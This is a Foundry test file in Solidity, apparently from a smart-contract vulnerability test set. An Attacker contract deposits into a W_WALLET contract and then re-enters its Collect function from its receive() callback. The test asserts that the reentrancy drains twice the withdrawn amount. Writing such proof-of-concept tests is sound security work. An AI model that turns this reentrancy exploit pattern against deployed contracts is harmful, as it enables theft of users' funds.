
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {W_WALLET,Log} from "../src/W_WALLET.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";

contract TestReentrancyW_WALLET is Test {
    using stdStorage for StdStorage;
    
    W_WALLET public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        Log log = new Log();
        _contractUnderTest = new W_WALLET(address(log));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        
        vm.warp(block.timestamp + 1000);
        
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    W_WALLET public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = W_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        victim.Put{value: msg.value}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(victim).balance;
        
        storedAttackVal = val;
        
        victim.Collect(val);
        
        if (address(victim).balance == initialSnapshot - (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(storedAttackVal);
        }
    }

    fallback() external payable {}
}
